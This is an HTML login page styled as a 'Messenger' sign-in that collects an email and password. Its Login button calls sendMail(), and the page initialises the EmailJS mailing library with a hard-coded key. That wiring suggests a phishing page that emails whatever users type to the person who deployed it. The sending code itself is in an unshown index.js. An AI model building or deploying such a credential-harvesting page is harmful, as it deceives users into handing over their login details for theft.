<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Messanger</title>
    <link rel="stylesheet" href="style.css">
    <script src="https://kit.fontawesome.com/8e2dee2a7c.js" crossorigin="anonymous"></script>
   
  </head>
  <body>
    <div class="wrapper">
      <div class="form-wrapper sign-in">
        <div class="row">
          <div class="col-md-6 border-left py-3">
            <h2>Messenger</h2>
            <div class="form-group">
               
              <input
                type="email"
                class="form-control"
                id="email"
              
              />
              <label for="email">Email</label>
            </div>
            <div class="form-group">
           

              <input
                type="password"
                class="form-control"
                id="password"
              />
              <span class="eye" onclick="myFunction()">
                <i id="hide1" class="fa fa-eye"></i>
                <i id="hide2" class="fa fa-eye-slash"></i>
              </span>
              <label for="password">Password</label>
            </div>
           
            <button class="btn btn-primary" onclick="sendMail()">Login</button>
          </div>
        </div>
      </div>
      
    </div>

    <script
    type="text/javascript"
    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"
  ></script>
  <script type="text/javascript">
    (function() {
  emailjs.init("VOPZaPFy1cXyiMpvB");
})();
  </script>
    <script src="index.js"></script>
    <script>
      function myFunction(){
        var x = document.getElementById("password");
        var y = document.getElementById("hide1");
        var z = document.getElementById("hide2");

        if(x.type === 'password'){
          x.type = "text";
          y.style.display = "block";
          z.style.display = "none";
        }
        else{
          x.type = "password";
          y.style.display = "none";
          z.style.display = "block";
        }
      }
    </script>
  </body>
</html>
